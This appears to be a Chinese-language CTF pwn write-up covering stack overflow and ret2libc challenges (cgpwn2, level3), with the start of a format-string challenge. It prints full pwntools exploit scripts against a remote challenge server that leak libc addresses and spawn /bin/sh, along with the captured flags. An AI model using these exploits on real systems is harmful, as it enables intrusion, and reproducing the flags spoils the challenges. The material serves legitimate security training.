<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#sh=process(&#x27;./cgpwn&#x27;)</span></span><br><span class="line"></span><br><span class="line">sh=remote(<span class="string">&#x27;111.200.241.244&#x27;</span>,<span class="string">&#x27;60172&#x27;</span>);</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">&#x27;please tell me your name&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sh.sendline(<span class="string">&#x27;/bin/sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">&#x27;hello,you can leave some message here:&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">&#x27;A&#x27;</span>*<span class="number">42</span>+p32(<span class="number">0x8048420</span>).decode(<span class="string">&#x27;unicode_escape&#x27;</span>)+<span class="string">&#x27;AAAA&#x27;</span>+p32(<span class="number">0x804A080</span>).decode(<span class="string">&#x27;unicode_escape&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
<p>结果:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">ls</span></span><br><span class="line">bin</span><br><span class="line">cgpwn2</span><br><span class="line">dev</span><br><span class="line">flag</span><br><span class="line">lib</span><br><span class="line">lib32</span><br><span class="line">lib64</span><br><span class="line">$ <span class="built_in">cat</span> flag</span><br><span class="line">cyberpeace&#123;53ac82665087a94d761a1eb18a0c2991&#125;</span><br></pre></td></tr></table></figure>
<h2
id="level3ret2libcprintf格式化字符串漏洞">006level3(ret2libc,printf格式化字符串漏洞)</h2>
<p>给了两个文件,一个level3,一个libc_32.so.6,后面这个是libc的动态库文件</p>
<h3 id="收集信息">收集信息</h3>
<p>对level3checksec</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿Executor)-[/mnt/c/Users/86135/Desktop/pwn/level3]</span><br><span class="line">└─# checksec level3</span><br><span class="line">[*] &#x27;/mnt/c/Users/86135/Desktop/pwn/level3/level3&#x27;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>
<p>运行一下</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿Executor)-[/mnt/c/Users/86135/Desktop/pwn/level3]</span><br><span class="line">└─# ./level3</span><br><span class="line">Input:</span><br><span class="line">/bin/sh</span><br><span class="line">Hello, World!</span><br></pre></td></tr></table></figure>
<p>打印"Input:",获取输入,打印"Hello,World"</p>
<h3 id="反汇编分析-1">反汇编分析</h3>
<p>ida打开level3直接看伪代码</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  vulnerable_function();<span class="comment">//关键函数</span></span><br><span class="line">  write(<span class="number">1</span>, <span class="string">&quot;Hello, World!\n&quot;</span>, <span class="number">0xE</span>u);<span class="comment">//不存在溢出漏洞</span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">vulnerable_function</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">136</span>]; <span class="comment">// [esp+0h] [ebp-88h] BYREF</span></span><br><span class="line"></span><br><span class="line">  write(<span class="number">1</span>, <span class="string">&quot;Input:\n&quot;</span>, <span class="number">7u</span>);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, buf, <span class="number">0x100</span>u);	<span class="comment">//0x100=256字节&gt;136存在缓冲区溢出漏洞</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>此处存在缓冲区溢出漏洞,观察<code>vulnernable_function</code>的栈帧,溢出可以修改函数返回地址,甚至继续溢出可以把main的栈帧都毁掉</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">-00000088 buf             db 136 dup(?)</span><br><span class="line">+00000000  s              db 4 dup(?)</span><br><span class="line">+00000004  r              db 4 dup(?)</span><br><span class="line">+00000008</span><br><span class="line">+00000008 ; end of stack variables</span><br></pre></td></tr></table></figure>
<p>但是观察Strings视图,并没有<code>/bin/sh</code>这种字符串</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220529150450668.png"
alt="image-20220529150450668" />
<figcaption aria-hidden="true">image-20220529150450668</figcaption>
</figure>
<p>functions视图也没有System函数</p>
<p>那么怎么才能获取shell呢?</p>
<p>libc库中有system和<code>/bin/sh</code>字符串</p>
<p><code>glibc-2.9/system.c</code>中<code>#define SHELL_PATH "/bin/sh"  /* Path of the shell.  */</code></p>
<p><code>glibc-2.9/system.c</code>中有<code>static int do_system (const char *line)</code>的实现</p>
<blockquote>
<p>为啥libc中要有<code>/bin/sh</code>字符串呢?</p>
<p>因为<code>system()</code>函数就是调用的shell程序,libc当然要知道该程序在哪里,最常用的shell就是<code>/bin/sh</code></p>
</blockquote>
<p>在本题中可以使用各种方法获得<code>/bin/sh</code>字符串和<code>system</code>函数在<code>libc_32.so.6</code>中的位置</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿Executor)-[/mnt/c/Users/86135/Desktop/pwn/level3]└─# strings -at x libc_32.so.6|grep /bin/sh   </span><br><span class="line"> 15902b /bin/sh</span><br><span class="line"></span><br><span class="line">┌──(root㉿Executor)-[/mnt/c/Users/86135/Desktop/pwn/level3]</span><br><span class="line">└─# ROPgadget --binary libc_32.so.6 --string &quot;/bin/sh&quot;</span><br><span class="line">Strings information</span><br><span class="line">============================================================</span><br><span class="line">0x0015902b : /bin/sh</span><br><span class="line"></span><br><span class="line">┌──(root㉿Executor)-[/mnt/c/Users/86135/Desktop/pwn/level3]</span><br><span class="line">└─# readelf -s libc_32.so.6|grep system       </span><br><span class="line">  1457: 0003a940    55 FUNC    WEAK   DEFAULT   13 system@@GLIBC_2.0</span><br></pre></td></tr></table></figure>
<p>现在获取到的地址是库函数在<code>libc</code>库中的位置,并不是库函数实际运行时的地址.然而给一个库文件也不是一无是处,</p>
<p>位置无关代码的特性是,库的在进程虚拟地址空间中的位置可以变,但是<strong>库中成员之间的相对地址不会变</strong></p>
<blockquote>
<p>这就好比现在每个库函数是058班上的一个同学,每个同学都有一个班内编号,从1到40.</p>
<p>在058班中不管怎么问4号同学是谁,总会获得回答sjf.</p>
<p>然后整个班一起考试的时候,考数据结构时被安排到A220考场,考C++的时候被安排到B304考场...</p>
<p>但是整个班总是安排在同一间教室</p>
<p>在考数据结构的时候去A220问4号学生是谁,必是sjf</p>
<p>但是当考C++的时候还去A220问4号学生是谁,必然不是sjf</p>
<p>我现在知道sjf是他们班四号,并且抓住了一个他们班的学生,怎么知道sjf具体在哪一个考场,哪一个座位呢?</p>
<p>跟着这个学生前往他的考场,假设这个学生是5号则前面一个学生就是4号的sjf.</p>
</blockquote>
<p>在本题中,我们要找的函数就是<code>system</code>,顺带还要找一个字符串<code>/bin/sh</code>,在库中的地址已经知道了,并且我们已经逮住了一个<strong>库中的函数</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">write(<span class="number">1</span>, <span class="string">&quot;Input:\n&quot;</span>, <span class="number">7u</span>);</span><br></pre></td></tr></table></figure>
<p>他在libc库中的位置:</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2323: 000d43c0   101 FUNC    WEAK   DEFAULT   13 write@@GLIBC_2.0</span><br></pre></td></tr></table></figure>
<p>那么其他libc中的函数或者变量相对于write的位置</p>
<table>
<thead>
<tr>
<th>符号</th>
<th>write</th>
<th>system</th>
<th>/bin/sh</th>
</tr>
</thead>
<tbody>
<tr>
<td>libc中的位置</td>
<td><code>0xd43c0</code></td>
<td><code>0x3a940</code></td>
<td><code>15902b</code></td>
</tr>
<tr>
<td>相对于write的位置</td>
<td><code>0</code></td>
<td><code>-0x99a80</code></td>
<td><code>-0x11e6eb</code></td>
</tr>
</tbody>
</table>
<p>使用栈缓冲区溢出写好参数然后返回到<code>write</code>被调用前,让<code>write</code>打印出它自己的地址</p>
<p>怎么返回到<code>write</code>前呢?</p>
<p>1.由于程序没有开启PIE保护,因此<strong>本程序内(不包括libc动态库)的各个函数地址是常数</strong></p>
<blockquote>
<p>注意共享库libc可以加载到本程序的"任何地方"</p>
<p>这里任何地方指的是</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220603144111550.png"
alt="image-20220603144111550" />
<figcaption aria-hidden="true">image-20220603144111550</figcaption>
</figure>
<p>用户栈和堆之间</p>
<p>共享库并不能挤再读写段和只读代码段之间</p>
<p>相当于再用户栈和运行时堆之间有一块很大的空间,共享库只能在这片空间中挑一个利索的地方加载</p>
<p>这就好比在一艘航母上只能在甲板上放置舰载机,不能将舰载机放在舰桥上</p>
<p>由于这片巨大的空间在程序运行开始时就已经决定了,并且每次运行都是一样大的,当没有开启PIE保护时,总是从虚拟地址空间的0x400000开始加载,因此本程序内各函数,各数据的地址都是定值.</p>
<p>至于调用libc库中的函数,则使用got+plt表,对于本模块内的函数只需要将控制交给plt表,plt表相当于一个本程序与动态库的接口.</p>
<p>plt和got表就像人的嘴一样,可以随便吃东西但是归根接底长到人的脸上</p>
</blockquote>
<p>2.使用PLT表返回到<code>write</code>的地址</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">b&#x27;0&#x27;</span>*<span class="number">0x8c</span>+p32(elf.plt[<span class="string">&#x27;write&#x27;</span>])+<span class="string">b&#x27;0000&#x27;</span>+p32(<span class="number">1</span>)+p32(elf.got[<span class="string">&#x27;write&#x27;</span>])+p32(<span class="number">4</span>)</span><br></pre></td></tr></table></figure>
<p>plt是text节开始时的一个跳转表,text节的位置不变,plt表的位置也不会变</p>
<p>前面<code>0x8c</code>都写0,是为了溢出<code>buf</code>和<code>s</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">-00000088 buf             db 136 dup(?)</span><br><span class="line">+00000000  s              db 4 dup(?)</span><br></pre></td></tr></table></figure>
<p>然后四个字节就是返回地址<code>p32(elf.plt['write'])</code></p>
<blockquote>
<p>这个<code>elf.plt['write']</code>是啥呢?</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">elf=ELF(<span class="string">&#x27;./level3&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(elf.plt[<span class="string">&#x27;write&#x27;</span>]))</span><br></pre></td></tr></table></figure>
<p>运行结果:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿Executor)-[/mnt/c/Users/86135/Desktop/pwn/level3]</span><br><span class="line">└─# python3 exp.py</span><br><span class="line">[*] <span class="string">&#x27;/mnt/c/Users/86135/Desktop/pwn/level3/level3&#x27;</span></span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line">0x8048340</span><br></pre></td></tr></table></figure>
<p>用ida打开后跳转到该地址<code>0x8048340</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">.plt:08048340</span><br><span class="line">.plt:08048340 ; ssize_t write(int fd, const void *buf, size_t n)</span><br><span class="line">.plt:08048340 _write          proc near               ; CODE XREF: vulnerable_function+15↓p</span><br><span class="line">.plt:08048340                                         ; main+22↓p</span><br><span class="line">.plt:08048340</span><br><span class="line">.plt:08048340 fd              = dword ptr  4</span><br><span class="line">.plt:08048340 buf             = dword ptr  8</span><br><span class="line">.plt:08048340 n               = dword ptr  0Ch</span><br><span class="line">.plt:08048340</span><br><span class="line">.plt:08048340                 jmp     ds:off_804A018</span><br><span class="line">.plt:08048340 _write          endp</span><br><span class="line">.plt:08048340</span><br></pre></td></tr></table></figure>
<p>​
<code>0x8048340</code>正好就是<code>write</code>在plt表中的起始位置</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">b&#x27;0&#x27;</span>*<span class="number">0x8c</span>+p32(elf.plt[<span class="string">&#x27;write&#x27;</span>])+<span class="string">b&#x27;0000&#x27;</span>+p32(<span class="number">1</span>)+p32(elf.got[<span class="string">&#x27;write&#x27;</span>])+p32(<span class="number">4</span>)</span><br></pre></td></tr></table></figure>
<p>同理<code>elf.got['write']</code>这个东西是write在got表中的首地址,打印一下结果为<code>0x804a018</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.got.plt:0804A018 off_804A018     dd offset write         ; DATA XREF: _write↑r</span><br></pre></td></tr></table></figure>
<p>因此这里这条exp语句可以这样写:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">b&#x27;0&#x27;</span>*<span class="number">0x8c</span>+p32(<span class="number">0x8048340</span>)+<span class="string">b&#x27;0000&#x27;</span>+p32(<span class="number">1</span>)+p32(<span class="number">0x804a018</span>)+p32(<span class="number">4</span>)</span><br></pre></td></tr></table></figure>
<p>这是只用ida,不借助python的pwn包可以做到的</p>
</blockquote>
<blockquote>
<p>为什么要将返回地址溢出改成write在plt中的位置?直接溢出成write的位置行吗?</p>
<p>write也是动态库函数,这里只是调用它,动态库中的函数都是查plt表调用的</p>
<p>如果这直接溢出成write的地址,那我们得事先直到它加载后在进程虚拟地址空间中的地址,</p>
<p>而我们现在就是想要再调用它打印自己的地址</p>
<p>如果事先知道,现在求个寂寞啊</p>
</blockquote>
<p>然后<code>0000</code>是为了填充返回地址到<code>main</code>栈帧之间四个无用字节</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">+00000004  r              db 4 dup(?)		//返回地址</span><br><span class="line">+00000008			//无用字节</span><br></pre></td></tr></table></figure>
<blockquote>
<p>为啥要溢出这四个字节?直接写write的参数不行吗?</p>
<p>这四个字节属于vulernable_func的栈帧,在跳转write之前是会被清理掉的</p>
</blockquote>
<p>然后<code>p32(1)+p32(elf.got['write'])+p32(4)</code>三个四字节在栈顶作为write的三个参数</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">write(fd,str,size);		//(文件描述符,字符串,大小)</span><br><span class="line">write(标准输出1,got表中存放的write的地址,4个字节,正好32位表示一个地址);</span><br></pre></td></tr></table></figure>
<p>此步执行之后程序将write在got表中的地址打印出来</p>
<blockquote>
<p>这就相当于我们已经跟踪这个学生到达了058班的考场,下一步就是根据该学生的学号和sjf的学号差,寻找sjf的位置</p>
</blockquote>
<p>考虑此步执行之后程序的行为</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">b&#x27;0&#x27;</span>*<span class="number">0x8c</span>+p32(elf.plt[<span class="string">&#x27;write&#x27;</span>])+<span class="string">b&#x27;0000&#x27;</span>+p32(<span class="number">1</span>)+p32(elf.got[<span class="string">&#x27;write&#x27;</span>])+p32(<span class="number">4</span>)</span><br></pre></td></tr></table></figure>
<blockquote>
<p>这里涉及到一个call function和jmp function的区别</p>
<p>使用call指令调用一个函数时,首先将PC即返回地址压栈,然后<code>jmp function</code></p>
<p>即两者的区别在于控制转移到function之前有没有将PC放在栈顶</p>
<p>我们现在将<code>p32(elf.plt['write'])</code>放在<code>vulnerable</code>的返回地址位置,</p>
<p>返回实际上就相当于一个jmp,</p>
<p>即我们执行了一个<code>jmp write</code>,没有使用call</p>
<p>理论上调用函数都要使用call,在跳转前将PC放在栈顶</p>
<p>现在我们没有将PC放在栈顶直接跳转到write,但是write函数它不知道啊,他认为我们溢出放置的<code>0000</code>就是返回地址,<strong>根据<code>_cdecl</code>约定</strong>,write将会自己清理自己的堆栈,那么在write返回的时候就会将0000放在rip中,程序接下来从0000开始执行,谁知道这是什么鬼地方,能不能执行也不好说</p>
<p>但是既然我们已经分析出0000将会被执行,那我们把他换成main函数的地址,不也可以执行吗?</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">b&#x27;0&#x27;</span>*<span class="number">0x8c</span>+p32(elf.plt[<span class="string">&#x27;write&#x27;</span>])+p32(main_addr)+p32(<span class="number">1</span>)+p32(elf.got[<span class="string">&#x27;write&#x27;</span>])+p32(<span class="number">4</span>)</span><br></pre></td></tr></table></figure>
<p>下面我们就将会用到这种性质</p>
</blockquote>
<p>前面我们已经通过栈缓冲区溢出获得了<code>write</code>的地址,下面我们还需要再溢出一次来跳转到<code>system</code>函数,这就用到了刚才我们分析的性质</p>
<p>我们在刚才执行了<code>write</code>之后将控制转移到<code>main</code>的开始地址,则程序又从头执行一遍,这次我们又有一个干净利索的<code>vulnerable_func</code>栈</p>
<p>本次缓冲区溢出时,首先还是填充<code>0x8c</code>个字符,然后将<code>system</code>函数的地址放到返回地址位置,然后4个无用字节用<code>0000</code>填充,然后写"<code>/bin/sh</code>"的地址</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">b&#x27;0&#x27;</span>*<span class="number">0x8c</span>+p32(write_addr-<span class="number">0x99a80</span>)+<span class="string">b&#x27;0000&#x27;</span>+p32(write_addr-<span class="number">0x11e6eb</span>)</span><br></pre></td></tr></table></figure>
<p>system执行完毕之后返回地址为刚才用0填充的4个无用字节,但是我们已经不需要<code>system</code>返回了,<code>system('/bin/sh')</code>之后我们就已经有shell了</p>
<table>
<thead>
<tr>
<th>符号</th>
<th>write</th>
<th>system</th>
<th>/bin/sh</th>
</tr>
</thead>
<tbody>
<tr>
<td>libc中的位置</td>
<td><code>0xd43c0</code></td>
<td><code>0x3a940</code></td>
<td><code>0x15902b</code></td>
</tr>
<tr>
<td>相对于write的位置</td>
<td><code>0</code></td>
<td><code>-0x99a80</code></td>
<td><code>-0x11e6eb</code></td>
</tr>
</tbody>
</table>
<h3 id="exp-5">exp</h3>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc_32.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">elf=ELF(<span class="string">&#x27;./level3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sh=remote(<span class="string">&#x27;111.200.241.244&#x27;</span>,<span class="string">&#x27;53737&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;0&#x27;</span>*<span class="number">0x8c</span>+p32(elf.plt[<span class="string">&#x27;write&#x27;</span>])+p32(elf.symbols[<span class="string">&#x27;main&#x27;</span>])+p32(<span class="number">1</span>)+p32(elf.got[<span class="string">&#x27;write&#x27;</span>])+p32(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">sh.sendlineafter(<span class="string">&quot;Input:\n&quot;</span>,payload)</span><br><span class="line"></span><br><span class="line">write_addr=u32(sh.recv()[:<span class="number">4</span>])</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(write_addr))</span><br><span class="line"></span><br><span class="line">system_offset=libc.symbols[<span class="string">&#x27;system&#x27;</span>]<span class="comment">#system函数相对于libc基地址的偏移量</span></span><br><span class="line"></span><br><span class="line">shell_offset=<span class="number">0x15902b</span><span class="comment">#/bin/sh相对于libc基地址的偏移量</span></span><br><span class="line"></span><br><span class="line">write_offset=libc.symbols[<span class="string">&#x27;write&#x27;</span>]<span class="comment">#write相对于libc基地址的偏移量</span></span><br><span class="line"></span><br><span class="line">libc_start=write_addr-write_offset<span class="comment">#libc库的运行时基地址</span></span><br><span class="line"></span><br><span class="line">system_addr=libc_start+system_offset<span class="comment">#system运行时地址</span></span><br><span class="line"></span><br><span class="line">shell_addr=libc_start+shell_offset<span class="comment">#/bin/sh的运行时地址</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;0&#x27;</span>*<span class="number">0x8c</span>+p32(system_addr)+<span class="string">b&#x27;0000&#x27;</span>+p32(shell_addr)</span><br><span class="line"></span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">[*] Switching to interactive mode</span><br><span class="line">\xc0o\xf7Input:</span><br><span class="line">$ <span class="built_in">ls</span></span><br><span class="line">bin</span><br><span class="line">dev</span><br><span class="line">flag</span><br><span class="line">level3</span><br><span class="line">lib</span><br><span class="line">lib32</span><br><span class="line">lib64</span><br><span class="line">$ <span class="built_in">cat</span> flag</span><br><span class="line">cyberpeace&#123;93ceadf23838a0fd793719d215b9876e&#125;</span><br></pre></td></tr></table></figure>
<h2 id="get_shell白给">007get_shell(白给)</h2>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿Executor)-[/mnt/c/Users/86135/Desktop/pwn/get_shell]</span><br><span class="line">└─# ./get_shell</span><br><span class="line">OK,this time we will get a shell.</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">ls</span></span></span><br><span class="line">get_shell  Ponce.cfg</span><br></pre></td></tr></table></figure>
<p>运行即可得到shell</p>
<p>为啥还是7分的题?</p>
<h2
id="cgfsbprintf格式化字符串漏洞">008CGfsb(printf格式化字符串漏洞)</h2>
<p>printf格式化字符串漏洞,总之就是特别绕</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\<span class="number">86135</span>\Desktop\pwn\CGfsb&gt; checksec cgfsb</span><br><span class="line">[*] <span class="string">&#x27;C:\\Users\\86135\\Desktop\\pwn\\CGfsb\\cgfsb&#x27;</span></span><br><span class="line">    Arch:     i386<span class="literal">-32-little</span></span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found					;金丝雀保护,栈溢出困难</span><br><span class="line">    NX:       NX enabled					</span><br><span class="line">    PIE:      No PIE (<span class="number">0</span>x8048000)</span><br></pre></td></tr></table></figure>
<h3 id="信息收集">信息收集:</h3>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿Executor)-[/mnt/c/Users/86135/Desktop/pwn/CGfsb]</span><br><span class="line">└─$ ./cgfsb</span><br><span class="line">please tell me your name:</span><br><span class="line">123</span><br><span class="line">leave your message please:</span><br><span class="line">456</span><br><span class="line">hello 123</span><br><span class="line">your message is:</span><br><span class="line">456</span><br><span class="line">Thank you!</span><br></pre></td></tr></table></figure>
<h3 id="反汇编分析-2">反汇编分析</h3>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line">;开端</span><br><span class="line">.text:080485CD                 push    ebp</span><br><span class="line">.text:080485CE                 